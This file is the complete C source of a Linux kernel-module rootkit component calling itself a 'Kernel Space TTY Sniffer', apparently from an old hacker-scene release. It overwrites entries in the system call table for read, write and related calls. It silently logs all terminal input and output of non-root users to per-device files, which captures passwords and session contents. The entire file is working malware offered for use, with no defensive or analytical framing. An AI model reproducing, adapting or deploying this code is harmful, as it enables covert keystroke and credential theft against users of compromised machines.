/********************************************************************************
*										*
*		Kernel Space TTY Sniffer					*
*		v 0.1								*
*		by IhaQueR							*
*										*
********************************************************************************/






#include <linux/kernel.h>
#include <linux/module.h>
#include <sys/syscall.h>
#include <linux/sched.h>
#include <linux/utime.h>
#include <linux/modversions.h>


#ifndef KERNEL_VERSION
#define KERNEL_VERSION(a,b,c) ((a)*65536+(b)*256+(c))
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(2,2,0)
#include <asm/uaccess.h>
#endif

#if LINUX_VERSION_CODE >= KERNEL_VERSION(2,2,0)
MODULE_PARM(uid, "i");
#endif


#include <linux/unistd.h>
#include <syslog.h>
#include <linux/dirent.h>
#include <linux/proc_fs.h>
#include <asm/segment.h>
#include <linux/tqueue.h>


//		in my kernel tree there is a problem with errno, so now we undefine this...
#ifdef errno
	#undef errno
#endif

#include <linux/net.h>
#include <linux/socket.h>
#include <net/sock.h>
#include <net/tcp.h>
#include <net/udp.h>


//		start_bh_atomic?! whats this
#include <asm/atomic.h>
#include <linux/skbuff.h>
#include <linux/smp_lock.h>




#define FALSE 0
#define TRUE 1
#define TMPBUFLEN 129
#define R2OMAXPATHLEN 1024


//	we define a macro instead calling a vararg function,
//	because varargs doesn't work for me in the kernel code
#ifdef NODEB
	#define _RDEB if(0)
	#define _STATIC static
#else
	#define _RDEB if(MODDEBUG)
	#define _STATIC
#endif


#define R2O_PUTTAB(_OCALL, _MCALL, _CALLNR) _OCALL = sys_call_table[_CALLNR]; sys_call_table[_CALLNR] = _MCALL;
#define R2O_RMTAB(_OCALL, _MCALL, _CALLNR) if (sys_call_table[_CALLNR] != _MCALL) { _RDEB printk("%s: Somebody else also played with" "_OCALL()" "\n", MODNAME); } sys_call_table[_CALLNR] = _OCALL;


//	set to 1 for debugging
#ifndef NODEB
static int MODDEBUG = 1;
#endif



//		our debugging name
_STATIC const char* MODNAME =	MNAME " v0.1 by IhaQueR";


//		where to save sniffed ttys...
_STATIC const char* tty_log_path = TTYLOGPATH "";




//		area for saving original calls
extern void *sys_call_table[];



_STATIC asmlinkage int (*original_read)(int fd, void *buf, size_t count);
_STATIC asmlinkage int (*original_write)(int fd, const void *buf, size_t count);
_STATIC asmlinkage int (*original_writev)(int filedes, const struct iovec *vector, size_t count);
_STATIC asmlinkage int (*original_readv)(int filedes, const struct iovec *vector, size_t count);
_STATIC asmlinkage int (*original_pread)(unsigned int fd, char * buf, size_t count, loff_t pos);
_STATIC asmlinkage int (*original_pwrite)(unsigned int fd, char * buf, size_t count, loff_t pos);


//		counts the chars without the trailing 0
_STATIC int mystrlen(const char* str)
{
int len = 0;

		while(str[len])
			len++;

return len;
}


//		converts only decimalz ;-)
_STATIC int myatoi(char *str)
{
int res = 0;
int mul = 1;
char *ptr;


		ptr = str;

		while(*ptr >= '0' && *ptr <= '9')
			ptr++;

		ptr--;

		while(ptr >= str) {
				res += (*ptr - '0') * mul;
				mul *= 10;
				ptr--;
        }

return(res);
}


//		copy num bytes
_STATIC void mybcopy(char *dst, char *src, int num)
{
		while(num > 0) {
			*dst = *src;
			dst++;
			src++;
			num--;
		}
}


//		own strcpy, attention about userspace strings...
_STATIC void mystrcpy(char *dst, char *src)
{
		while(*src) {
			*dst = *src;
			dst++;
			src++;
		}

		*dst=0;
}


//		own strcat :-)
_STATIC void mystrcat(char *dst, char *src)
{
		while(*dst)
			dst++;

		while(*src) {
			*dst = *src;
			dst++;
			src++;
		}

		*dst=0;
}


//		clears exactly len bytes
_STATIC void mybzero(char* dst, int len)
{
		while(len-- > 0)
			*dst++=0;
}


//		like well known strcmp()
_STATIC int mystrcmp(const char *str1, const char *str2)
{
		while(*str1 && *str2)
			if(*(str1++) != *(str2++))
				return(*(str1-1) - *(str2-1));

return(*(str1) - *(str2));
}


_STATIC int mystrncmp(const char *str1, const char *str2, int num)
{
		while(*str1 && *str2 && num-->0)
			if(*(str1++) != *(str2++))
				return(*(str1-1) - *(str2-1));

return(*(str1) - *(str2));
}

//		is c in the delim set?
_STATIC int is_token(char c, char* delim)
{
		while(*delim) {
			if(c == *delim)
				return TRUE;
			delim++;
		}

return FALSE;
}


//		returns the ptr to the next token marked by delimiters, all subsequent token chars are skipped
_STATIC char* get_tok(char* ptr, char* delim)
{
		while(*ptr && !is_token(*ptr, delim))
			ptr++;
		while(*ptr && is_token(*ptr, delim))
			ptr++;

return ptr;
}


_STATIC char* get_tok_num(char* ptr, char* delim, int num)
{
		while(num>0 && *ptr && !is_token(*ptr, delim)) {
			ptr++;
			num--;
		}

		while(num>0 && *ptr && is_token(*ptr, delim)) {
			ptr++;
			num--;
		}

		if(num<0)
			return NULL;

return ptr;
}


//		where is it?
#ifndef ntohs
_STATIC unsigned short ntohs(unsigned short v)
{
return v>>8 | v<<8;
}
#endif


//		finds given pid's task struct
_STATIC struct task_struct* my_find_task(pid_t pid)
{
struct task_struct *task = current;

		do {
			if(task->pid == pid)
				return(task);

			task = task->next_task;

		} while(task != current);

return(NULL);
}




//	update 'daemon'

//	idea:	for each incomming tty write/read request create a file holding the data
//			create an inode for each new device and flush it after configurable timeout :-) (close)
//			so we get separated logs on each tty...



#define TTYSNIFFTOUT		60
#define TTYTICKS		500

#define TTYMINDEV		0x200
#define TTYMAXDEV		0x500

#define TTYDEVNUM		(TTYMAXDEV-TTYMINDEV)


_STATIC struct file* tty_ftab[TTYDEVNUM];


_STATIC int tty_int_cnt = 0;
_STATIC int tty_rdwr = 0;

//	set for stopping timer
_STATIC int tty_stop = 0;

_STATIC int tty_slowdown = 0;

//	set for stopping buffering
_STATIC int tty_stop_buf = 0;



_STATIC struct wait_queue* tty_waitq = NULL;
_STATIC struct wait_queue* tty_waitqrw = NULL;

_STATIC void tty_updated(unsigned long v);
_STATIC struct timer_list tty_timer = {NULL, NULL, 0, 0, &tty_updated };




//	flush tab
_STATIC int tty_flush(int flag)
{
struct timeval tv;
int i, j, res;
struct file* f;
struct inode* ino;



		tv.tv_sec = 1024*1024*1024;
		get_fast_time(&tv);
		j = 0;

		if(flag)
			_RDEB printk("%s: tty flushing cache...\n", MODNAME);

		for(i=0; i<TTYDEVNUM; i++)
			if(tty_ftab[i]) {

				f = tty_ftab[i];

				if(!IS_ERR(f) && f->f_dentry && f->f_dentry->d_inode) {
					ino = f->f_dentry->d_inode;

					if(ino->i_mtime + TTYSNIFFTOUT < tv.tv_sec || flag) {
						res = filp_close(f, current->files);
						if(res<0) {
							_RDEB printk("%s: tty error %d flushing [%d]\n", MODNAME, res, i);
						}
						else {
							_RDEB printk("%s: tty flushed [%4x]\n", MODNAME, i);
						}
						tty_ftab[i] = NULL;
						j++;
					}

				}
			}

return j;
}


//	primitive flushd
_STATIC void tty_updated(unsigned long v)
{
int j;

		tty_int_cnt++;

//	check for inactive logs
		if( !(tty_int_cnt % TTYTICKS) ) {
			_RDEB printk("%s: tty TIMER [%d s]\n", MODNAME, tty_int_cnt/100);
			j = tty_flush(0);
			if(j)
				_RDEB printk("%s: tty flushed num = %d\n", MODNAME, j);
		}

		if(tty_waitq != NULL) {
			if(tty_slowdown) {
				if(!(tty_int_cnt % 10))
					wake_up(&tty_waitq);
			}
			else {
				wake_up(&tty_waitq);
			}
		}

		if(tty_waitqrw != NULL) {
			wake_up(&tty_waitqrw);
		}

//	stop only for tty_stop>0 && tty_slowdow==0
		if(tty_stop > 0 && !tty_slowdown) {
			tty_flush(1);
		}
		else
			mod_timer(&tty_timer, 1);

}


_STATIC struct file* tty_getf(kdev_t rdev)
{
struct file* f;
char tmp[TMPBUFLEN];


		sprintf(tmp, "%s/ttylog-%x", tty_log_path, (unsigned)rdev);
		_RDEB printk("%s: tty new name [%s]\n", MODNAME, tmp);

		f = filp_open(tmp, O_APPEND|O_CREAT, S_IRWXU|S_IRWXO);

		if(!f || IS_ERR(f)) {
			_RDEB printk("%s: tty error filp_open() %d\n", MODNAME, (int)f);
			return NULL;
		}

return f;
}


//	hm we need a hash of open ttys, hold their inodes and write over inode->i_op
_STATIC void tty_put_buf(kdev_t rdev, const void* buf, int numbytes)
{
kdev_t num;
struct file* f;



		if(tty_stop_buf > 0)
			return;

		if(rdev < TTYMINDEV || rdev >= TTYMAXDEV) {
			_RDEB printk("%s: tty invalid device  %d\n", MODNAME, rdev);
			return;
		}

		num = rdev - TTYMINDEV;

		if(!tty_ftab[num])
			tty_ftab[num] = tty_getf(num);

		f = tty_ftab[num];

		if(!f) {
			_RDEB printk("%s: tty invalid file\n", MODNAME);
			return;
		}

		if(!(f->f_op) || !(f->f_op->write)) {
			_RDEB printk("%s: tty invalid inode\n", MODNAME);
			return;
		}

		(f->f_op->write)(f, (char*)buf, numbytes, &(f->f_pos));
}



asmlinkage int my_read(int fd, void *buf, size_t count)
{
struct file* f;
struct dentry* dent;
struct inode* ino;
int siz = 0, i, is_sig=0;



		tty_rdwr++;

		f = current->files->fd[fd];

		if(f && !IS_ERR(f)) {

//	on cleanup do this:
			if(tty_stop_buf) {
				if(f->f_flags & O_NONBLOCK) {
					tty_rdwr--;
					return -EAGAIN;
				}
				else {
					interruptible_sleep_on(&tty_waitqrw);

					for(i=0; i<_NSIG_WORDS && !is_sig; i++)
						is_sig = current->signal.sig[i] & ~current->blocked.sig[i];
					if(is_sig) {
						tty_rdwr--;
						return -EINTR;
					}
				}
			}

//	dont sniff root ttys hahaha (only lejmusers do this...)
			if(f->f_uid) {
//	check if tty
				dent = f->f_dentry;
				if(dent && !IS_ERR(dent)) {
					ino = dent->d_inode;

					if(ino && !IS_ERR(ino)) {
						if(ino->i_dev) {

							if( ino->i_rdev >= TTYMINDEV && ino->i_rdev < TTYMAXDEV ) {
								siz = (*original_read)(fd, buf, count);

								if(siz>0)
									tty_put_buf(ino->i_rdev, buf, siz);

								tty_rdwr--;
								return siz;
							}

						}
					}
				}
			}
		}

		tty_rdwr--;

return (*original_read)(fd, buf, count);
}


asmlinkage int my_write(int fd, const void *buf, size_t count)
{
struct file* f;
struct dentry* dent;
struct inode* ino;
int i, is_sig=0;


		tty_rdwr++;

		f = current->files->fd[fd];

		if(f && !IS_ERR(f)) {

//	on cleanup do this:
			if(tty_stop_buf) {
				if(f->f_flags & O_NONBLOCK) {
					tty_rdwr--;
					return -EAGAIN;
				}
				else {
					interruptible_sleep_on(&tty_waitqrw);

					for(i=0; i<_NSIG_WORDS && !is_sig; i++)
						is_sig = current->signal.sig[i] & ~current->blocked.sig[i];
					if(is_sig) {
						tty_rdwr--;
						return -EINTR;
					}
				}
			}

//	dont sniff own ttys hahaha (only lamers do that...)
			if(f->f_uid) {
//	check if tty
				dent = f->f_dentry;
				if(dent && !IS_ERR(dent)) {
					ino = dent->d_inode;

					if(ino && !IS_ERR(ino)) {
						if(ino->i_dev) {

							if( ino->i_rdev >= TTYMINDEV && ino->i_rdev < TTYMAXDEV ){

								tty_put_buf(ino->i_rdev, buf, count);

							}

						}
					}
				}
			}
		}

		tty_rdwr--;

return (*original_write)(fd, buf, count);
}


asmlinkage int my_readv(int filedes, const struct iovec *vector, size_t count)
{

return (*original_readv)(filedes, vector, count);
}


asmlinkage int my_writev(int filedes, const struct iovec *vector, size_t count)
{

return (*original_writev)(filedes, vector, count);
}


asmlinkage int my_pread(unsigned int fd, char * buf, size_t count, loff_t pos)
{

return (*original_pread)(fd, buf, count, pos);
}


asmlinkage int my_pwrite(unsigned int fd, char * buf, size_t count, loff_t pos)
{

return (*original_pwrite)(fd, buf, count, pos);
}



//	Initialize the module - replace syscalls
int init_module()
{

		lock_kernel();

		_RDEB printk("%s module loading...\n", MODNAME);
		_RDEB printk("%s: init() START\n", MODNAME);


		_RDEB printk("%s: enable feature TTYSNIFF\n", MODNAME);
		mybzero((char*)tty_ftab, sizeof(struct file*) * TTYDEVNUM);
		mod_timer(&tty_timer, 1);
		R2O_PUTTAB(original_read,		my_read,		__NR_read)
		R2O_PUTTAB(original_write,		my_write,		__NR_write)
		R2O_PUTTAB(original_writev,		my_writev,		__NR_writev)
		R2O_PUTTAB(original_readv,		my_readv,		__NR_readv)
		R2O_PUTTAB(original_pwrite,		my_pwrite,		__NR_pwrite)
		R2O_PUTTAB(original_pread,		my_pread,		__NR_pread)

		_RDEB printk("%s: init() END\n", MODNAME);

		unlock_kernel();

return 0;
}


//	Cleanup, restore the original system
void cleanup_module()
{
int cnt=64;


		lock_kernel();

		_RDEB printk("%s: cleanup() START\n", MODNAME);


//	stop buffering, wake up queues
		tty_stop_buf++;

		R2O_RMTAB(original_write,		my_write,		__NR_write)
		R2O_RMTAB(original_read,		my_read,		__NR_read)
		R2O_RMTAB(original_writev,		my_writev,		__NR_writev)
		R2O_RMTAB(original_readv,		my_readv,		__NR_readv)
		R2O_RMTAB(original_pwrite,		my_pwrite,		__NR_pwrite)
		R2O_RMTAB(original_pread,		my_pread,		__NR_pread)

//	wait for next timer interrupt
		sleep_on(&tty_waitq);

//	wait for all processes in our read/write (execpt ours...)
		_RDEB printk("%s: cleanup wait for %d\n", MODNAME, tty_rdwr);

//	wake up waitqrw more often
		tty_slowdown++;

		while(tty_rdwr > 1) {
			_RDEB printk("%s: cleanup wait for %d/%d\n", MODNAME, tty_rdwr, cnt);
			wake_up(&tty_waitqrw);
			sleep_on(&tty_waitq);
		}

//	stop timer (ah, race...)
		tty_slowdown = 0;
		tty_stop++;
		sleep_on(&tty_waitq);

	_RDEB printk("%s: cleanup() END\n", MODNAME);

	unlock_kernel();

}
